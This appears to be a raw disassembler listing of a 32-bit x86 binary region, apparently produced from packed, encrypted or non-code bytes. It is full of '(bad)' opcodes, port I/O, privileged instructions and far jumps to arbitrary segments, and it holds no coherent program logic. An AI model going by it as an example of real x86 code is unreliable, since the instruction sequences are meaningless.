  425d9a:	mov    ebp,0x9dcf8ed7
  425d9f:	in     eax,dx
  425da0:	stos   DWORD PTR es:[edi],eax
  425da1:	adc    edx,eax
  425da3:	call   FWORD PTR [ebp+0x37]
  425da6:	sbb    bh,bl
  425da8:	mov    es,ecx
  425daa:	fldenv [edx]
  425dac:	hlt    
  425dad:	mov    WORD PTR [edx-0x51],ds
  425db0:	mov    al,0xc
  425db2:	imul   edi,DWORD PTR [ecx],0xffffff83
  425db5:	push   edx
  425db6:	sti    
  425db7:	scas   eax,DWORD PTR es:[edi]
  425db8:	daa    
  425db9:	outs   dx,DWORD PTR ds:[esi]
  425dba:	dec    ebp
  425dbb:	fwait
  425dbc:	mov    esp,DWORD PTR ds:0x63f56db
  425dc2:	sbb    al,ch
  425dc4:	mov    dl,0x29
  425dc6:	sub    eax,0x6ebad78f
  425dcb:	add    esi,ebp
  425dcd:	inc    eax
  425dce:	in     al,dx
  425dcf:	outs   dx,BYTE PTR ds:[esi]
  425dd0:	dec    ebp
  425dd1:	movups xmm2,XMMWORD PTR ds:0x507ee444
  425dd8:	dec    edi
  425dd9:	mov    dh,0x10
  425ddb:	arpl   WORD PTR [ebx-0x64],ax
  425dde:	sar    BYTE PTR [edx],cl
  425de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425de1:	sbb    ecx,edi
  425de3:	div    BYTE PTR [edx-0x5c7436d4]
  425de9:	popa   
  425dea:	aaa    
  425deb:	add    bl,al
  425ded:	es cld 
  425def:	fisubr DWORD PTR [eax+0x47ab1015]
  425df5:	clc    
  425df6:	pop    edx
  425df7:	call   0xed2c:0x31397a0
  425dfe:	jbe    0x425e00
  425e00:	bound  ecx,QWORD PTR [ecx+0x619b67fb]
  425e06:	inc    eax
  425e07:	inc    esp
  425e08:	sub    DWORD PTR [edi+0x52c8b94a],ebp
  425e0e:	aaa    
  425e0f:	pop    eax
  425e10:	fiadd  WORD PTR [edi+ebx*1+0x21a3802]
  425e17:	es xchg ebp,eax
  425e19:	sbb    edi,DWORD PTR [edx+eiz*4-0xa79e729]
  425e20:	mov    bh,0xd4
  425e22:	(bad)  
  425e23:	sub    eax,0xbb0e3207
  425e28:	dec    eax
  425e29:	mov    ah,BYTE PTR [edi+0x53]
  425e2c:	stc    
  425e2d:	dec    eax
  425e2e:	bound  esp,QWORD PTR fs:[edi+edi*2-0x46]
  425e33:	movd   mm3,DWORD PTR [edi+0x31bedcbe]
  425e3a:	xchg   ebx,eax
  425e3b:	sbb    BYTE PTR [ebx+0x37],bl
  425e3e:	mov    ch,0x4
  425e40:	add    edi,ecx
  425e42:	xchg   ecx,eax
  425e43:	not    ebx
  425e45:	aaa    
  425e46:	jle    0x425de0
  425e48:	pop    esp
  425e49:	stos   DWORD PTR es:[edi],eax
  425e4a:	pop    ds
  425e4b:	xchg   ebx,esi
  425e4d:	adc    eax,DWORD PTR [eax-0x6e]
  425e50:	clc    
  425e51:	sub    ebx,0x3b
  425e54:	and    edi,DWORD PTR [edi+0x2d8fb8df]
  425e5a:	mov    dh,0xcc
  425e5c:	and    ebp,ecx
  425e5e:	dec    edx
  425e5f:	cwde   
  425e60:	xor    bl,dl
  425e62:	and    al,0x69
  425e64:	fsub   QWORD PTR [ecx-0x2]
  425e67:	test   DWORD PTR [ebx-0x39],0xa59f4321
  425e6e:	sub    eax,DWORD PTR [edi+0x4121bb0a]
  425e74:	push   edi
  425e75:	xchg   esp,eax
  425e76:	shl    eax,1
  425e78:	arpl   WORD PTR [esi+ecx*8+0x1d],ax
  425e7c:	jo     0x425ea1
  425e7e:	mov    ecx,0xc40c39fd
  425e83:	push   ss
  425e84:	jl     0x425e71
  425e86:	push   ecx
  425e87:	call   FWORD PTR [edx-0x51fb52b9]
  425e8d:	stos   DWORD PTR es:[edi],eax
  425e8e:	in     al,dx
  425e8f:	repz aam 0xcb
  425e92:	mov    bh,0x76
  425e94:	mov    ah,0xf1
  425e96:	inc    edi
  425e97:	mov    edx,0x4e6c8517
  425e9c:	arpl   WORD PTR ds:0x151cf6e4,si
  425ea2:	int    0x8e
  425ea4:	retf   
  425ea5:	ds inc eax
  425ea7:	cmp    eax,0x1891b0da
  425eac:	adc    DWORD PTR [edi],ecx
  425eae:	aam    0x43
  425eb0:	push   ebp
  425eb1:	pop    ebp
  425eb2:	inc    edx
  425eb3:	adc    eax,0xf51b8031
  425eb8:	(bad)  
  425eb9:	outs   dx,DWORD PTR ds:[esi]
  425eba:	inc    eax
  425ebb:	retf   0xdf90
  425ebe:	pop    esi
  425ebf:	cmp    al,0x11
  425ec1:	or     al,0x7e
  425ec3:	mov    ebp,0x32bdaa6d
  425ec8:	mov    BYTE PTR [esi-0xa],dh
  425ecb:	in     al,dx
  425ecc:	mov    ebx,0x5b03dde5
  425ed1:	in     al,dx
  425ed2:	bound  edx,QWORD PTR [ecx+ecx*4]
  425ed5:	sbb    DWORD PTR ds:0x8bf3b09f,0x6c
  425edc:	in     eax,dx
  425edd:	sbb    edx,ebx
  425edf:	pop    ds
  425ee0:	ja     0x425e98
  425ee2:	push   ds
  425ee3:	fadd   DWORD PTR [edx+eax*2-0x6e363f1d]
  425eea:	retf   0xf5b5
  425eed:	pop    esi
  425eee:	hlt    
  425eef:	push   edx
  425ef0:	fidivr DWORD PTR [edx+0x7c]
  425ef3:	push   0x16842ff6
  425ef8:	mov    ebx,fs
  425efa:	dec    eax
  425efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425efc:	cmp    ecx,edx
  425efe:	mov    cl,0x3f
  425f00:	(bad)  
  425f02:	push   ecx
  425f03:	lahf   
  425f04:	or     al,0xb6
  425f06:	(bad)  
  425f08:	add    al,bh
  425f0a:	stc    
  425f0b:	xchg   DWORD PTR [edx],edx
  425f0d:	and    al,0xe1
  425f0f:	sbb    esp,DWORD PTR [edi+0x595f4fb9]
  425f15:	sub    eax,0x8acbf9a0
  425f1a:	push   ss
  425f1b:	js     0x425eae
  425f1d:	pop    ss
  425f1e:	stc    
  425f1f:	sub    DWORD PTR [eax-0x3f87edb7],ebp
  425f25:	in     al,dx
  425f26:	sbb    eax,0x21fba9a5
  425f2b:	push   0xa4a0fae
  425f30:	or     ebx,esp
  425f32:	int3   
  425f33:	mov    eax,0xd085f4bf
  425f38:	out    dx,eax
  425f39:	ins    DWORD PTR es:[edi],dx
  425f3a:	or     BYTE PTR [edi+0x4db9d69f],bl
  425f40:	popf   
  425f41:	sbb    ebp,DWORD PTR [bp+0x5a1c]
  425f46:	mov    al,ds:0xb347d660
  425f4b:	sub    BYTE PTR [ecx-0x45],0xce
  425f4f:	mov    ?,ecx
  425f51:	mov    bh,0xca
  425f53:	icebp  
  425f54:	(bad)  
  425f55:	ror    DWORD PTR [ebx-0x5f0bc7ed],1
  425f5b:	les    esp,FWORD PTR [esi-0x520ad564]
  425f61:	fs test eax,0xaed3a900
  425f67:	pushf  
  425f68:	jnp    0x425ef6
  425f6a:	int    0x72
  425f6c:	sub    DWORD PTR [ecx-0x6e],esi
  425f6f:	enter  0xa5df,0x73
  425f73:	out    0x94,al
  425f75:	jns    0x425f6c
  425f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f78:	data16 data16 jne 0x425ff7
  425f7c:	jle    0x425f58
  425f7e:	inc    ebx
  425f7f:	mov    bh,0x1a
  425f81:	lahf   
  425f82:	add    BYTE PTR [ebx-0x1d7952d9],ch
  425f88:	iret   
  425f89:	lahf   
  425f8a:	daa    
  425f8b:	add    al,0xc5
  425f8d:	add    esi,DWORD PTR [ebx-0x4997776e]
  425f93:	aaa    
  425f94:	retf   
  425f95:	fcmovnb st,st(0)
  425f97:	retf   
  425f98:	das    
  425f99:	outs   dx,BYTE PTR ds:[esi]
  425f9a:	out    0x43,eax
  425f9c:	lahf   
  425f9d:	jns    0x425ffb
  425f9f:	pop    ebx
  425fa0:	pop    ebp
  425fa1:	mov    esi,0xd57b5ef8
  425fa6:	gs out 0xcb,al
  425fa9:	xor    ah,BYTE PTR [ecx]
  425fab:	mov    ch,0x28
  425fad:	cmp    bh,dl
  425faf:	cmp    BYTE PTR [eax-0x5f1aaee],dl
  425fb5:	fnstenv [edi-0x11b6b6fc]
  425fbb:	cmc    
  425fbc:	pop    ebx
  425fbd:	xlat   BYTE PTR ds:[ebx]
  425fbe:	icebp  
  425fbf:	xchg   esi,eax
  425fc0:	int    0x86
  425fc2:	xchg   BYTE PTR [ebp+0x2e],dl
  425fc5:	out    dx,al
  425fc6:	jns    0x425fc5
  425fc8:	jmp    0x878a:0x9c641f33
  425fcf:	mov    ebp,0xf18c1390
  425fd4:	pop    ecx
  425fd5:	lock loop 0x42604a
  425fd8:	lock call 0x6c1d:0xe7f53baa
  425fe0:	retf   
  425fe1:	mov    dh,0xa7
  425fe3:	mov    dl,0x51
  425fe5:	out    dx,al
  425fe6:	sahf   
  425fe7:	ins    DWORD PTR es:[edi],dx
  425fe8:	loopne 0x425fbd
  425fea:	shl    DWORD PTR [eax-0x57eb3f94],0x29
  425ff1:	call   0xb4ae22fa
  425ff6:	sbb    al,0xa8
  425ff8:	std    
  425ff9:	jg     0x426012
  425ffb:	cld    
  425ffc:	(bad)  
  425ffd:	jb     0x425f95
  425fff:	dec    eax
  426000:	jb     0x425fcd
  426002:	jo     0x425fae
  426004:	(bad)  
  426005:	or     eax,0xfb979b2a
  42600a:	mov    bh,0xa8
  42600c:	mov    ds:0xed912d12,eax
  426011:	sbb    edx,DWORD PTR [eax+edi*4]
  426014:	xchg   ecx,eax
  426015:	sub    BYTE PTR [ebx+ebp*2-0x9],al
  426019:	pop    esi
  42601a:	aam    0xd5
  42601c:	nop
  42601d:	(bad)  
  42601e:	scas   al,BYTE PTR es:[edi]
  42601f:	adc    esi,DWORD PTR [esi-0x4cdec0ea]
  426025:	(bad)  [esi-0x55]
  426028:	push   cs
  426029:	gs dec eax
  42602b:	out    dx,al
  42602c:	ins    BYTE PTR es:[edi],dx
  42602d:	rol    BYTE PTR [eax+edi*8],cl
  426030:	mov    edi,0x23cc4d76
  426035:	sti    
  426036:	jae    0x426075
  426038:	dec    ebp
  426039:	jae    0x426057
  42603b:	in     eax,dx
  42603c:	es inc esp
  42603e:	jmp    0x4260aa
  426040:	mov    esi,0xd66b2707
  426045:	imul   ecx,DWORD PTR [ebx-0x2b],0x5f
  426049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42604a:	cs (bad) 
  42604d:	add    DWORD PTR [ebx],esi
  42604f:	aam    0x97
  426051:	retf   
  426052:	xchg   esp,eax
  426053:	push   edx
  426054:	ds sbb al,0xd
  426057:	sar    ah,0x2f
  42605a:	mov    esp,0xfb0ae832
  42605f:	inc    esp
  426060:	into   
  426061:	lods   al,BYTE PTR ds:[esi]
  426062:	mov    edi,0x5155b3fa
  426067:	out    0x7f,al
  426069:	dec    ecx
  42606a:	push   0x8440190b
  42606f:	dec    esp
  426070:	jno    0x4260e0
  426072:	xchg   DWORD PTR [ecx+0x7f],esi
  426075:	popa   
  426076:	inc    ebx
  426077:	(bad)  
  426078:	mov    cl,0x80
  42607a:	leave  
  42607b:	out    0x28,al
  42607d:	pushf  
  42607e:	sub    DWORD PTR fs:[ebp+ecx*2-0x2c],eax
  426083:	out    0x39,eax
  426085:	push   esi
  426086:	cmp    dl,BYTE PTR [ecx]
  426088:	mov    dl,0xe9
  42608a:	pop    edi
  42608b:	sar    BYTE PTR [eax+ebx*8+0x75a04e89],1
  426092:	inc    ebx
  426093:	xor    DWORD PTR [ebp+0x3],eax
  426096:	pop    ecx
  426097:	mov    cl,0x4d
  426099:	repz fistp DWORD PTR [bx]
  42609d:	xor    DWORD PTR [eax+0x6f],edx
  4260a0:	ret    0x2946
  4260a3:	(bad)  
  4260a4:	push   DWORD PTR [esi+0xd]
  4260a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260a8:	(bad)  
  4260a9:	sbb    BYTE PTR [ecx-0x59],ch
  4260ac:	outs   dx,DWORD PTR ds:[esi]
  4260ad:	(bad)  
  4260ae:	(bad)  
  4260af:	or     dl,BYTE PTR [ecx+0x2]
  4260b2:	jnp    0x426093
  4260b4:	or     BYTE PTR [ecx+eiz*1+0x17c622c7],dh
  4260bb:	jae    0x4260a1
  4260bd:	iret   
  4260be:	aam    0xd7
  4260c0:	lea    edx,[edx+eiz*1-0x71]
  4260c4:	mov    eax,ds:0x18b410ca
  4260c9:	sub    DWORD PTR [ebx+edx*8],esi
  4260cc:	jp     0x4260f1
  4260ce:	lea    eax,[edi-0x2a]
  4260d1:	dec    ebx
  4260d2:	or     BYTE PTR [edi+0x0],0x0
	...
  4260de:	add    BYTE PTR [eax],al
  4260e0:	add    BYTE PTR [edx],bl
  4260e2:	call   0x3e3d72
  4260e7:	pop    edi
  4260e8:	out    dx,al
  4260e9:	dec    edx
  4260ea:	pop    esi
  4260eb:	popa   
  4260ec:	sub    edi,DWORD PTR [edi]
  4260ee:	leave  
  4260ef:	out    0xc,eax
  4260f1:	jbe    0x4260ca
  4260f3:	add    DWORD PTR [eax],eax
  4260f5:	stos   DWORD PTR es:[edi],eax
  4260f6:	add    eax,DWORD PTR [eax]
  4260f8:	add    BYTE PTR [eax-0x61d24f52],ah
  4260fe:	div    BYTE PTR [ecx-0x68]
  426101:	dec    edi
  426102:	mov    eax,DWORD PTR [esi-0x41]
  426105:	loop   0x42609a
  426107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426108:	dec    esp
  426109:	test   eax,0x329b4a7e
  42610e:	gs add ah,0xc9
  426112:	sar    DWORD PTR [edx+eiz*1-0x3accf615],0xda
  42611a:	cld    
  42611b:	jns    0x426141
  42611d:	mov    eax,0x665bff52
  426122:	push   esi
  426123:	sub    ch,bl
  426125:	xchg   ebx,eax
  426126:	pop    ds
  426127:	sahf   
  426128:	shl    eax,1
  42612a:	loopne 0x42618c
  42612c:	mov    ebp,cs
  42612e:	mov    eax,0x390ec1d9
  426133:	or     DWORD PTR [edi+0x55],esi
  426136:	and    dl,BYTE PTR [esi-0x5b6c5257]
  42613c:	or     bh,bh
  42613e:	or     dh,ch
  426140:	int    0xd7
  426142:	bts    edi,0xb7
  426146:	data16 inc BYTE PTR [edi-0x18]
  42614a:	arpl   WORD PTR [esi],sp
  42614c:	(bad)  
  42614e:	popa   
  42614f:	aas    
  426150:	or     cl,ch
  426152:	sub    al,0xbd
  426154:	popf   
  426155:	nop
  426156:	cmc    
  426157:	push   0xa93594aa
  42615c:	jge    0x426191
  42615e:	jne    0x4261af
  426160:	push   0x98d612a4
  426165:	jnp    0x426158
  426167:	(bad)  [esp+ebp*2-0x16938925]
  42616e:	lock mov ch,0x89
  426171:	jecxz  0x426170
  426173:	jmp    0x4260fb
  426175:	mov    ds,ebp
  426177:	sub    al,0x90
  426179:	push   eax
  42617a:	aad    0x68
  42617c:	ffreep st(6)
  42617e:	leave  
  42617f:	sbb    BYTE PTR [eax],al
  426181:	xchg   esi,eax
  426182:	jbe    0x42611f
  426184:	out    dx,eax
  426185:	std    
  426186:	pop    ds
  426187:	aam    0x71
  426189:	shl    BYTE PTR [ecx],0x1e
  42618c:	inc    esp
  42618d:	jnp    0x4261e8
  42618f:	adc    DWORD PTR [eax-0x35de9bac],ebx
  426195:	pop    ebx
  426196:	jmp    FWORD PTR [edx+0x32e9772d]
  42619c:	in     al,dx
  42619d:	mov    ds:0xf0650a0c,al
  4261a2:	adc    eax,0x8a554a9a
  4261a7:	test   eax,0xa94288fe
  4261ac:	pop    ecx
  4261ad:	mov    edi,0x33307451
  4261b2:	and    DWORD PTR [eax-0x34ef7dd1],esi
  4261b8:	mov    bl,0x7f
  4261ba:	jmp    DWORD PTR [ebx+0x6e]
  4261bd:	adc    DWORD PTR ds:0x4f629791,ebp
  4261c3:	dec    ah
  4261c5:	mov    BYTE PTR es:[esi+edx*8],ah
  4261c9:	jl     0x426154
  4261cb:	pop    ebx
  4261cc:	test   BYTE PTR [edx+0x3a78e717],cl
  4261d2:	xchg   esp,eax
  4261d3:	jl     0x426234
  4261d5:	push   edx
  4261d6:	mov    gs,WORD PTR [eax+ebp*4]
  4261d9:	je     0x4261cf
  4261db:	(bad)  
  4261dc:	pop    ebp
  4261dd:	pop    es
  4261de:	ins    DWORD PTR es:[edi],dx
  4261df:	fsub   DWORD PTR ds:0xe1038fd8
  4261e5:	call   0x629d:0x41b3828f
  4261ec:	lock fimul WORD PTR [ebp+0x2c8080e6]
  4261f3:	mov    al,ds:0x910fb442
  4261f8:	xchg   edx,eax
  4261f9:	adc    eax,0x3c8e5a9d
  4261fe:	push   0x18
  426200:	mov    bh,0x4a
  426202:	cmp    al,0xd4
  426204:	out    dx,eax
  426205:	popa   
  426206:	mov    esi,DWORD PTR [edi]
  426208:	daa    
  426209:	ja     0x4261dc
  42620b:	xchg   DWORD PTR [edx+0xc],eax
  42620e:	enter  0x7c7a,0x2e
  426212:	push   edi
  426213:	shl    BYTE PTR [esi+eax*2-0xfbda9a9],0xb9
  42621b:	xchg   DWORD PTR [esi],edx
  42621d:	inc    eax
  42621e:	repz pop esp
  426220:	push   esi
  426221:	fcom   DWORD PTR [ebp-0x66]
  426224:	sbb    eax,0xcacd5053
  426229:	sub    bl,BYTE PTR [eax-0x55]
  42622c:	cli    
  42622d:	jbe    0x426289
  42622f:	mov    bl,0xab
  426231:	mov    ?,esp
  426233:	test   BYTE PTR [ebx+0x5affb6a5],0x50
  42623a:	nop
  42623b:	xor    bl,BYTE PTR [esi]
  42623d:	adc    edi,0xfffffff8
  426240:	pop    edx
  426241:	xchg   ecx,eax
  426242:	jns    0x42626d
  426244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426245:	mov    dh,0xd
  426247:	scas   al,BYTE PTR es:[edi]
  426248:	add    al,ah
  42624a:	inc    esi
  42624b:	push   ebx
  42624c:	xor    ah,BYTE PTR [ecx]
  42624e:	iret   
  42624f:	or     esi,ecx
  426251:	sbb    BYTE PTR [ecx-0xa046c68],dl
  426257:	pop    eax
  426258:	imul   bl
  42625a:	add    edi,DWORD PTR [eax+ecx*1]
  42625d:	int3   
  42625e:	out    0x33,al
  426260:	cs xchg esp,eax
  426262:	pop    edi
  426263:	jle    0x426260
  426265:	sub    ah,BYTE PTR [ebx-0x65]
  426268:	cmp    ebx,DWORD PTR [eax+0x60]
  42626b:	lods   al,BYTE PTR ds:[esi]
  42626c:	test   DWORD PTR [esi],edi
  42626e:	xor    dh,0x30
  426271:	or     ch,BYTE PTR [ecx+edi*2-0x5f]
  426275:	dec    ebp
  426276:	fld    QWORD PTR [edx+0x4e]
  426279:	or     cl,al
  42627b:	mov    esi,0xd0264930
  426280:	inc    ebx
  426281:	xchg   ebx,eax
  426282:	sub    edi,DWORD PTR [eax+eiz*4+0x6e2cd8eb]
  426289:	mov    esp,0x40f61df1
  42628e:	xchg   ebx,eax
  42628f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426290:	add    al,0x4c
  426292:	(bad)
  426295:	imul   ecx,DWORD PTR [ecx],0x25
  426298:	in     eax,dx
  426299:	jnp    0x42622b
  42629b:	xor    eax,0x3b0de0f
  4262a0:	adc    DWORD PTR [esi-0x16],ebx
  4262a3:	sbb    eax,0xe3dc009e
  4262a8:	adc    al,0xc9
  4262aa:	and    al,0xc5
  4262ac:	repz adc edx,DWORD PTR [ecx-0x4d456522]
  4262b3:	(bad)  
  4262b4:	pop    esp
  4262b5:	into   
  4262b6:	jne    0x426284
  4262b8:	mov    edx,0x66c11042
  4262bd:	add    eax,0x61c2006d
  4262c2:	pop    ecx
  4262c3:	(bad)  
  4262c4:	push   esi
  4262c5:	jecxz  0x426267
  4262c7:	push   edi
  4262c8:	(bad)  
  4262c9:	fistp  QWORD PTR [ebx+0x29]
  4262cc:	and    al,0xb5
  4262ce:	or     BYTE PTR [edx-0x33],dh
  4262d1:	jg     0x426317
  4262d3:	sbb    BYTE PTR [edx],bl
  4262d5:	mov    edi,0x7eee865b
  4262da:	xor    bl,BYTE PTR [ecx+0x33ae4f2a]
  4262e0:	xor    eax,0x8e7be6d5
  4262e5:	stos   BYTE PTR es:[edi],al
  4262e6:	cmp    al,0xba
  4262e8:	dec    eax
  4262e9:	sub    BYTE PTR [edi-0x71530ac5],0xa7
  4262f0:	or     bh,BYTE PTR [eax]
  4262f2:	push   0x7db4f75d
  4262f7:	mov    ebx,0xcbe081df
  4262fc:	cdq    
  4262fd:	pop    ebp
  4262fe:	adc    al,0x42
  426300:	ins    BYTE PTR es:[edi],dx
  426301:	dec    ecx
  426302:	out    0xab,eax
  426304:	jle    0x426364
  426306:	ret    
  426307:	dec    edi
  426308:	xchg   BYTE PTR [edx+0x2556f50a],al
  42630e:	std    
  42630f:	out    dx,al
  426310:	or     ebp,eax
  426312:	and    bh,al
  426314:	jp     0x426339
  426316:	and    ah,0x6c
  426319:	add    ecx,DWORD PTR [ecx+ecx*8+0x5f]
  42631d:	mov    eax,0x7733c92d
  426322:	aaa    
  426323:	inc    ebp
  426324:	pushf  
  426325:	adc    bl,BYTE PTR [ebx-0xb]
  426328:	pop    ds
  426329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	outs   dx,BYTE PTR ds:[esi]
  42632b:	add    ebx,DWORD PTR [edi+edx*8-0x8a54fa3]
  426332:	(bad)  [ebx]
  426334:	out    dx,al
  426335:	or     BYTE PTR [edi-0xb],ah
  426338:	xchg   ebx,eax
  426339:	push   ebx
  42633a:	dec    ebp
  42633b:	nop
  42633c:	(bad)  
  42633e:	inc    edx
  42633f:	jns    0x4262d1
  426341:	mov    eax,ds:0x810d3e9c
  426346:	fsub   DWORD PTR [ecx+0x1f38f2e1]
  42634c:	lds    eax,FWORD PTR [esi]
  42634e:	mov    al,0x85
  426350:	mov    al,ds:0xc3727397
  426355:	xor    BYTE PTR [esi],0xd0
  426358:	pop    es
  426359:	arpl   WORD PTR [ebp+0x7e9ccf7b],bp
  42635f:	mov    cl,0x7d
  426361:	jl     0x4262f9
  426363:	mov    dl,0x69
  426365:	sub    edi,eax
  426367:	jne    0x4263c1
  426369:	mov    eax,ds:0x787571d3
  42636e:	aad    0x8
  426370:	push   0xffffffc3
  426372:	mov    ss,WORD PTR [ebx+ebp*8]
  426375:	xchg   esp,eax
  426376:	iret   
  426377:	or     bl,cl
  426379:	push   edi
  42637a:	sahf   
  42637b:	mov    esi,esp
  42637d:	jmp    0x426327
  42637f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426380:	call   0xcfa2:0xc87180d9
  426387:	pop    ds
  426388:	shl    ch,cl
  42638a:	mov    edx,0xf7bf8438
  42638f:	push   edx
  426390:	xchg   ecx,eax
  426391:	stc    
  426392:	hlt    
  426393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426394:	add    DWORD PTR [edx+0x605fda0c],ebp
  42639a:	(bad)  
  42639b:	shl    ebp,1
  42639d:	jns    0x426413
  42639f:	mov    bh,0x9e
  4263a1:	inc    ecx
  4263a2:	lock cdq 
  4263a4:	sub    eax,0xef79f09
  4263a9:	test   BYTE PTR [edi-0x20a17965],dh
  4263af:	icebp  
  4263b0:	inc    esp
  4263b1:	jns    0x426350
  4263b3:	callw  0x4120
  4263b7:	in     al,dx
  4263b8:	cmp    dh,bh
  4263ba:	push   eax
  4263bb:	fadd   QWORD PTR [ebp+0x6b424ada]
  4263c1:	sub    bl,dl
  4263c3:	mov    ecx,0x8f97d166
  4263c8:	pushf  
  4263c9:	dec    ebx
  4263ca:	pop    eax
  4263cb:	bound  eax,QWORD PTR [ebx-0x25b04b5f]
  4263d1:	pop    eax
  4263d2:	sub    DWORD PTR [ecx],ebp
  4263d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263d5:	pushf  
  4263d6:	loopne 0x426457
  4263d8:	(bad)  
  4263da:	or     esp,edx
  4263dc:	fs add eax,0x5931203
  4263e2:	inc    ebp
  4263e3:	mov    ch,BYTE PTR [esi+0x193dd503]
  4263e9:	cdq    
  4263ea:	sbb    eax,0xf2826d99
  4263ef:	dec    edx
  4263f0:	inc    eax
  4263f1:	cmp    eax,0x1a6fbd63
  4263f6:	fs push ss
  4263f8:	or     edx,esi
  4263fa:	ret    0xa64e
  4263fd:	jmp    0x94c4:0x540a9123
  426404:	push   ebx
  426405:	mov    ds:0xd653aa63,eax
  42640a:	jecxz  0x4263ef
  42640c:	jp     0x4263ba
  42640e:	shl    BYTE PTR [ebx-0x2f],cl
  426411:	inc    DWORD PTR [ecx-0x6655f39f]
  426417:	out    dx,al
  426418:	jg     0x426493
  42641a:	lock push ds
  42641c:	(bad)  
  42641e:	jle    0x426489
  426420:	dec    edx
  426421:	addr16 cmp eax,0x30cef649
  426427:	stc    
  426428:	hlt    
  426429:	adc    al,0x13
  42642b:	comiss xmm1,DWORD PTR [ecx-0x63]
  42642f:	xchg   edi,eax
  426430:	mov    dl,ch
  426432:	sbb    dh,BYTE PTR [ecx]
  426434:	fsubp  st(0),st
  426436:	mov    BYTE PTR [esi-0x12a5481c],0x9f
  42643d:	cmp    DWORD PTR [edx+eiz*1],esp
  426440:	fs in  al,0xc5
  426443:	into   
  426444:	and    eax,0xf4d63758
  426449:	jne    0x4264bb
  42644b:	rol    dh,0xbd
  42644e:	(bad)  
  42644f:	cli    
  426450:	or     dl,cl
  426452:	es icebp 
  426454:	mov    dh,0x4
  426456:	push   ebp
  426457:	pop    ds
  426458:	or     DWORD PTR [ecx+0xed934c4],0xb18d8056
  426462:	adc    DWORD PTR [eax-0x132df6e6],edx
  426468:	mov    BYTE PTR [esi],0x45
  42646b:	sbb    eax,0xffffffdc
  42646e:	push   ebp
  42646f:	(bad)  
  426470:	fiadd  DWORD PTR [ebp+0x49bd65d0]
  426476:	sbb    eax,0x3c7ba709
  42647b:	das    
  42647c:	pandn  mm2,QWORD PTR [esi]
  42647f:	pusha  
  426480:	out    0x6e,al
  426482:	scas   eax,DWORD PTR es:[edi]
  426483:	addr16 mov esp,0x22769aa3
  426489:	jp     0x426458
  42648b:	fidivr WORD PTR [eax-0x1b6928db]
  426491:	sub    DWORD PTR [ecx],eax
  426493:	imul   esp,esp,0x1566001
  426499:	cdq    
  42649a:	inc    esi
  42649b:	cmc    
  42649c:	imul   ebx,edx,0xffffffe6
  42649f:	xor    al,0xc1
  4264a1:	and    edx,ecx
  4264a3:	bound  eax,QWORD PTR [eax]
	...
  4264b1:	loop   0x42652e
  4264b3:	push   ecx
  4264b4:	data16 fldcw WORD PTR [esi-0x9]
  4264b8:	dec    DWORD PTR [eax+0x6f]
  4264bb:	std    
  4264bc:	or     ebx,DWORD PTR [ecx]
  4264be:	retf   0xa4af
  4264c1:	and    ebx,ebx
  4264c3:	add    DWORD PTR [eax],eax
  4264c5:	stos   DWORD PTR es:[edi],eax
  4264c6:	add    eax,DWORD PTR [eax]
  4264c8:	add    BYTE PTR [ebx+0x26],al
  4264cb:	push   0xd9de220b
  4264d0:	sbb    edx,edx
  4264d2:	push   ecx
  4264d3:	ror    BYTE PTR [edx],1
  4264d5:	mov    bl,0x10
  4264d7:	aaa    
  4264d8:	lods   al,BYTE PTR ds:[esi]
  4264d9:	jge    0x426531
  4264db:	mov    cl,0x48
  4264dd:	add    DWORD PTR [edx+0x40],0xa8f5ec05
  4264e4:	aas    
  4264e5:	xchg   edi,eax
  4264e6:	imul   ebp,ecx,0xffffffc1
  4264e9:	add    ebx,ecx
  4264eb:	sub    eax,0x23be5793
  4264f0:	loopne 0x426485
  4264f2:	add    BYTE PTR [esi],0x3f
  4264f5:	in     al,dx
  4264f6:	lods   eax,DWORD PTR ds:[esi]
  4264f7:	cwde   
  4264f8:	cmc    
  4264f9:	pop    edx
  4264fa:	icebp  
  4264fb:	add    DWORD PTR [ecx-0x6e93dc76],edi
  426501:	cdq    
  426502:	add    al,0xd8
  426504:	push   esi
  426505:	jg     0x4264f8
  426507:	push   0xffffffb1
  426509:	loopne 0x4264c2
  42650b:	cld    
  42650c:	leave  
  42650d:	ja     0x426532
  42650f:	cmp    eax,0xe9e4ed39
  426514:	xor    cl,cl
  426516:	repnz pop esp
  426518:	jge    0x42653f
  42651a:	dec    edx
  42651b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42651c:	mov    esi,0x43c0cb4e
  426521:	test   eax,0x79dcd996
  426526:	add    ebp,esi
  426528:	test   BYTE PTR [ebx-0x3e4d8c50],bh
  42652e:	call   DWORD PTR [edx+0x24331e6]
  426534:	sar    DWORD PTR [ecx-0x50b89e46],1
  42653a:	mov    edx,0xfa62f4e6
  42653f:	call   0x2337:0x19027f9f
  426546:	jge    0x4264e0
  426548:	imul   esi,DWORD PTR [ecx],0xbf961f3d
  42654e:	lock mov cl,0xa6
  426551:	mov    ah,0xa0
  426553:	xchg   esp,eax
  426554:	jmp    0x8495:0x8ac78098
  42655b:	popa   
  42655c:	rcl    BYTE PTR [ebx*4+0x53154703],1
  426563:	in     eax,0x9e
  426565:	jg     0x42652e
  426567:	cmc    
  426568:	in     eax,0x2
  42656a:	add    ecx,DWORD PTR [ebx+0x6dfbca30]
  426570:	dec    ebx
  426571:	test   DWORD PTR ds:0x3a152f6b,edx
  426577:	push   esp
  426578:	int3   
  426579:	pop    es
  42657a:	test   DWORD PTR [ebx+0x2c91620c],edx
  426580:	inc    ecx
  426581:	mov    ds:0x12408d8e,al
  426586:	stos   BYTE PTR es:[edi],al
  426587:	mul    DWORD PTR [eax-0x24393154]
  42658d:	inc    ebp
  42658e:	aaa    
  42658f:	mov    ah,0xf7
  426591:	in     eax,0x63
  426593:	sbb    al,0x75
  426595:	cmp    BYTE PTR [edi+0x3d26162a],bl
  42659b:	nop
